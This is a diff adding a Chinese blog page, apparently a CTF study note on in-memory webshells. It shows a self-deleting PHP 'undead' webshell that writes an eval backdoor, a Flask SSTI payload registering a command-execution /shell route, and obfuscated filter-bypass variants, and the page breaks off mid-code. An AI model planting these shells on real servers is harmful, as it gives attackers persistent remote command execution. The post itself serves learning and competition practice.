@@ -1,0 +1,1258 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="一、前言 \u200b gh遇到了内存马的相关内容，这里好好学习一下相关内容 二、内存马是什么？ \u200b 内存马是一种无文件攻击手段，主要通过在内存中写入恶意代码来">
+<title>内存马</title>
+
+<link rel='canonical' href='http://localhost:1313/p/%E5%86%85%E5%AD%98%E9%A9%AC/'>
+
+<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="内存马">
+<meta property='og:description' content="一、前言 \u200b gh遇到了内存马的相关内容，这里好好学习一下相关内容 二、内存马是什么？ \u200b 内存马是一种无文件攻击手段，主要通过在内存中写入恶意代码来">
+<meta property='og:url' content='http://localhost:1313/p/%E5%86%85%E5%AD%98%E9%A9%AC/'>
+<meta property='og:site_name' content='liernian'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-05-12T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-05-12T00:00:00&#43;00:00'/>
+<meta name="twitter:title" content="内存马">
+<meta name="twitter:description" content="一、前言 \u200b gh遇到了内存马的相关内容，这里好好学习一下相关内容 二、内存马是什么？ \u200b 内存马是一种无文件攻击手段，主要通过在内存中写入恶意代码来">
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+  
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu11319725144555339807.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">💯</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">liernian</a></h1>
+            <h2 class="site-description">理想主义的中二少年</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/CaiJimmy/hugo-theme-stack'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>链接</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+                    
+                        <li id="i18n-switch">  
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+                            <select name="language" title="language" onchange="window.location.href = this.selectedOptions[0].value">
+                                
+                                    <option value="http://localhost:1313/en/" >English</option>
+                                
+                                    <option value="http://localhost:1313/" selected>简体中文</option>
+                                
+                                    <option value="http://localhost:1313/ar/" >عربي</option>
+                                
+                            </select>
+                        </li>
+                    
+                
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#一前言">一、前言</a></li>
+    <li><a href="#二内存马是什么">二、内存马是什么？</a>
+      <ol>
+        <li><a href="#大致原理">大致原理</a></li>
+      </ol>
+    </li>
+    <li><a href="#三内存马的类别">三、内存马的类别</a>
+      <ol>
+        <li><a href="#php不死马">php不死马</a>
+          <ol>
+            <li><a href="#原理">原理</a></li>
+            <li><a href="#小结">小结</a></li>
+          </ol>
+        </li>
+        <li><a href="#python-flask--内存马">python flask  内存马</a>
+          <ol>
+            <li><a href="#原理-1">原理</a></li>
+            <li><a href="#绕过">绕过</a></li>
+            <li><a href="#新版flask内存马">新版Flask内存马</a></li>
+            <li><a href="#小结-1">小结</a></li>
+          </ol>
+        </li>
+        <li><a href="#python-bottle-ssti内存马">python bottle ssti内存马</a>
+          <ol>
+            <li><a href="#bottle框架漏洞">bottle框架漏洞</a></li>
+            <li><a href="#原理-2">原理</a></li>
+            <li><a href="#小结-2">小结</a></li>
+          </ol>
+        </li>
+        <li><a href="#python-pyramid-内存马">python Pyramid 内存马</a>
+          <ol>
+            <li><a href="#原理-3">原理</a></li>
+            <li><a href="#小结-3">小结：</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+    <li><a href="#四后语">四、后语</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/" >
+                知识点总结
+            </a>
+        
+            <a href="/categories/web/" >
+                Web
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/%E5%86%85%E5%AD%98%E9%A9%AC/">内存马</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2025-05-12</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 11 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="一前言">一、前言
+</h2><p>​	gh遇到了内存马的相关内容，这里好好学习一下相关内容</p>
+<h2 id="二内存马是什么">二、内存马是什么？
+</h2><p>​	<strong>内存马</strong>是一种无文件攻击手段，主要通过在内存中写入恶意代码来实现对Web服务器的远程控制。</p>
+<p>​	大家熟知的一句话木马是一种有文件的木马，是需要有文件落地，才能进行rce的。如果删除了文件，就失去了shell。但是内存马不一样。内存马无文件落地，利用中间件的进程执行恶意代码。</p>
+<h3 id="大致原理">大致原理
+</h3><p>​	内存马的原理大概就是在web组件或者应用程序中，注册一层<strong>访问路由</strong>，访问者通过这层路由，来执行我们控制器中的代码</p>
+<p>​	简单来说，就是自定义一个路由，路由里调用一个函数，然后这个函数执行了什么内容，返回什么内容，都由你自己决定。记住这段话，在后续的学习中会有更深的理解</p>
+<h2 id="三内存马的类别">三、内存马的类别
+</h2><p>​	根据网页源码的脚本语言，内存马也有不同的类别，网上较多的是java内存马，不过小登我没打进过线下赛，java内存马还是之后再补，这里讲一下php和python的内存马</p>
+<h3 id="php不死马">php不死马
+</h3><p>（在靶场注入的时候把靶场搞崩了，所以不死马没有实例截图）</p>
+<h4 id="原理">原理
+</h4><p>php不死马是通过内存马启动后删除文件本身之前，使代码在内存中执行<strong>死循环</strong>，使管理员无法删除内存马，达到权限维持的目的</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ignore_user_abort</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">unlink</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$content</span> <span class="o">=</span> <span class="nx">‘</span><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">if</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;pass&#34;</span><span class="p">])</span><span class="o">==</span><span class="s2">&#34;098f6bcd4621d373cade4e832627b4f6&#34;</span><span class="p">){</span><span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">];)}</span> <span class="cp">?&gt;</span><span class="err">’;
+</span></span></span><span class="line"><span class="cl"><span class="err">file_put_contents(&#34;1.php&#34;, $content);
+</span></span></span><span class="line"><span class="cl"><span class="err">usleep(10000);
+</span></span></span><span class="line"><span class="cl"><span class="err">}
+</span></span></span><span class="line"><span class="cl"><span class="err">?&gt;
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>我们来分析一下代码：</p>
+<p><strong><code>set_time_limit(0)函数</code></strong>：设置允许脚本运行的时间，单位为秒，意味着脚本可以无限期地运行，不会被PHP的执行时间限制所中断。</p>
+<p><strong><code>ignore_user_abort()函数</code></strong>：函数设置与客户机断开是否会终止脚本的执行。即使用户在浏览器中停止加载页面，脚本仍然会继续执行。</p>
+<p><strong><code>unlink(FILE)函数</code></strong>：删除文件（防止文件落地被检测工具查杀）</p>
+<p>然后是while循环</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$content = ‘&lt;?php if(md5($_GET[&#34;pass&#34;])==&#34;098f6bcd4621d373cade4e832627b4f6&#34;){@eval($_POST[&#39;a&#39;];)} ?&gt;’;
+</span></span><span class="line"><span class="cl">file_put_contents(&#34;1.php&#34;, $content);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>上传1.php，内容是，检查通过get请求传递的pass参数的md5值是否等于&quot;098f6bcd4621d373cade4e832627b4f6&quot;如果通过，那么就可以执行eval函数</p>
+<p>（这里加一个md5值是为了防止木马别别的队伍利用，加密前为test）</p>
+<p>**usleep(10000)：**等待1秒后继续循环，这个睡眠操作是为了降低脚本的资源消耗，避免被系统检测到异常行为。</p>
+<h4 id="小结">小结
+</h4><p>php不死马的利用情况很少，一般文件上传的题目也不用不到，这里也就是简单学习一下，可以更深入理解内存马</p>
+<h3 id="python-flask--内存马">python flask  内存马
+</h3><h4 id="原理-1">原理
+</h4><p>​	底层原理就是下面这个函数，这里不多赘述，详情可见ssti篇</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">render_template_string()
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>​	然后要实现内存马的话需要注册一层路由，我们看看实现代码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#34;app.add_url_rule(&#39;/shell&#39;, &#39;shell&#39;, lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)).read())&#34;,{&#39;_request_ctx_stack&#39;:url_for.__globals__[&#39;_request_ctx_stack&#39;],&#39;app&#39;:url_for.__globals__[&#39;current_app&#39;]})}}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>下面是使用实例</p>
+<p><img src="/p/%E5%86%85%E5%AD%98%E9%A9%AC/image-20250512235736028.png"
+	width="1578"
+	height="965"
+	srcset="/p/%E5%86%85%E5%AD%98%E9%A9%AC/image-20250512235736028_hu1499755267660534025.png 480w, /p/%E5%86%85%E5%AD%98%E9%A9%AC/image-20250512235736028_hu15891544793494648464.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250512235736028"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="163"
+		data-flex-basis="392px"
+	
+></p>
+<p>​	我们来解释一下这个代码的原理</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](
+</span></span><span class="line"><span class="cl">    &#34;app.add_url_rule(
+</span></span><span class="line"><span class="cl">        &#39;/shell&#39;, 
+</span></span><span class="line"><span class="cl">        &#39;shell&#39;, 
+</span></span><span class="line"><span class="cl">        lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)).read()
+</span></span><span class="line"><span class="cl">    )&#34;,
+</span></span><span class="line"><span class="cl">    {
+</span></span><span class="line"><span class="cl">        &#39;_request_ctx_stack&#39;:url_for.__globals__[&#39;_request_ctx_stack&#39;],
+</span></span><span class="line"><span class="cl">        &#39;app&#39;:url_for.__globals__[&#39;current_app&#39;]
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>首先是</p>
+<p><code>url_for.__globals__['__ builtins __']['eval']</code></p>
+<p>​	<code>url_for</code>是<code>Flask</code>的一个内置函数, 通过<code>Flask</code>内置函数可以调用其<code>__globals__</code>属性, 该特殊属性能够返回函数所在模块命名空间的所有变量, 其中包含了很多已经引入的<code>modules</code>, 可以看到这里是支持<code>__builtins__</code>的。（就像ssti一样）</p>
+<p>​	之后就可以通过<code>__builtins__</code>这个modules进行命令执行，也是ssti的内容，这里不多赘述</p>
+<p>接下来是</p>
+<p><code>app.add_url_rule('/shell', 'shell', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'whoami')).read())</code></p>
+<p>​	这段代码实现了动态添加路由，处理该路由的函数是一个由<code>lambda</code>关键字定义的匿名函数，那么<code>lambda</code>是个什么东西呢</p>
+<p>​	我们先了解一下flask框架的路由注册</p>
+<p>​	首先，它是由<code>@app.route()</code>装饰器实现的，查看源码发现调用了<code>add_url_rule</code>函数来添加路由</p>
+<p><img src="/p/%E5%86%85%E5%AD%98%E9%A9%AC/image-20250513112956464.png"
+	width="866"
+	height="306"
+	srcset="/p/%E5%86%85%E5%AD%98%E9%A9%AC/image-20250513112956464_hu9629173357315967862.png 480w, /p/%E5%86%85%E5%AD%98%E9%A9%AC/image-20250513112956464_hu16916136644959180221.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250513112956464"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="283"
+		data-flex-basis="679px"
+	
+></p>
+<p>再跟进，查看<code>add_url_rule</code>函数的代码，其参数说明如下：</p>
+<p>​	rule: 函数对应的<code>URL</code>规则, 满足条件和<code>app.route</code>的第一个参数一样, 必须以<code>/</code>开头.<strong>（我们pyload传入/shell，注册url路由/shell）</strong></p>
+<p>​	endpoint: 端点, 即在使用<code>url_for</code>进行反转的时候, 这里传入的第一个参数就是<code>endpoint</code>对应的值, 这个值也可以不指定, 默认就会使用函数的名字作为<code>endpoint</code>的值.<strong>（pyload传入shell，端点名为shell）</strong></p>
+<p>​	view_func: <code>URL</code>对应的函数, 这里只需写函数名字而不用加括号.<strong>（pyload传入lambda作为处理逻辑）</strong></p>
+<p>​	provide_automatic_options: 控制是否应自动添加选项方法.<strong>（未传）</strong></p>
+<p>​	options: 要转发到基础规则对象的选项.<strong>（未传）</strong></p>
+<p>​	最后是</p>
+<p><code>lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'whoami')).read()</code></p>
+<p>​	这里<code>lambda</code>匿名函数, 其中通过<code>os</code>库的<code>popen</code>函数执行从GET请求中获取的<code>cmd</code>参数值并返回结果, 其中该参数值默认为<code>whoami</code></p>
+<p>​	然后是  <code>'_request_ctx_stack':url_for.__globals__['_request_ctx_stack'],'app':url_for.__globals__['current_app']}</code></p>
+<p>​	<code>_request_ctx_stack</code>是<code>Flask</code>的一个全局变量, 是一个<code>LocalStack</code>实例，记住这个<strong>stack</strong></p>
+<p>​	这里我们引入一下flask请求上下文管理机制</p>
+<p>​	在<code>Python</code>中分出了两种上下文: 请求上下文(request context)、应用上下文(session context)。当网页请求进入<code>Flask</code>时, 会实例化一个<code>Request Context</code>. 一个请求上下文中封装了请求的信息, 而上下文的结构是运用了一个<code>Stack</code>的栈结构, 也就是说它拥有一个栈所拥有的全部特性。<code>Request context</code>实例化后会被<code>push</code>到栈<code>_request_ctx_stack</code>中, 基于此特性便可以通过获取栈顶元素的方法来获取当前的请求.</p>
+<p>​	回到代码中，这段代码主要是指明所需变量的全局命名空间，保证<code>app</code>和<code>_request_ctx_stack</code>都能被找到，关于app的解释放在将bottle内存马那里。</p>
+<p>​	至此pyload的逻辑大致就清晰了。</p>
+<h4 id="绕过">绕过
+</h4><p>​	实际应用的话往往都存在过滤，因为是ssti的变种，所以绕过方式和ssti大差不差。</p>
+<p>​	值得一提的是</p>
+<p><code>url_for</code>可替换为<code>get_flashed_messages</code>或者<code>request.__init__</code>或者<code>request.application</code></p>
+<p>​	最后给出两个变种pyload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">request</span><span class="o">.</span><span class="n">application</span><span class="o">.</span><span class="vm">__self__</span><span class="o">.</span><span class="n">_get_data_for_json</span><span class="o">.</span><span class="fm">__getattribute__</span><span class="p">(</span><span class="s1">&#39;__globa&#39;</span><span class="o">+</span><span class="s1">&#39;ls__&#39;</span><span class="p">)</span><span class="o">.</span><span class="fm">__getitem__</span><span class="p">(</span><span class="s1">&#39;__bui&#39;</span><span class="o">+</span><span class="s1">&#39;ltins__&#39;</span><span class="p">)</span><span class="o">.</span><span class="fm">__getitem__</span><span class="p">(</span><span class="s1">&#39;ex&#39;</span><span class="o">+</span><span class="s1">&#39;ec&#39;</span><span class="p">)(</span><span class="s2">&#34;app.add_url_rule(&#39;/h3rmesk1t&#39;, &#39;h3rmesk1t&#39;, lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;shell&#39;, &#39;calc&#39;)).read())&#34;</span><span class="p">,{</span><span class="s1">&#39;_request_ct&#39;</span><span class="o">+</span><span class="s1">&#39;x_stack&#39;</span><span class="p">:</span><span class="n">get_flashed_messages</span><span class="o">.</span><span class="fm">__getattribute__</span><span class="p">(</span><span class="s1">&#39;__globa&#39;</span><span class="o">+</span><span class="s1">&#39;ls__&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="s1">&#39;_request_&#39;</span><span class="o">+</span><span class="s1">&#39;ctx_stack&#39;</span><span class="p">),</span><span class="s1">&#39;app&#39;</span><span class="p">:</span><span class="n">get_flashed_messages</span><span class="o">.</span><span class="fm">__getattribute__</span><span class="p">(</span><span class="s1">&#39;__globa&#39;</span><span class="o">+</span><span class="s1">&#39;ls__&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="s1">&#39;curre&#39;</span><span class="o">+</span><span class="s1">&#39;nt_app&#39;</span><span class="p">)})</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
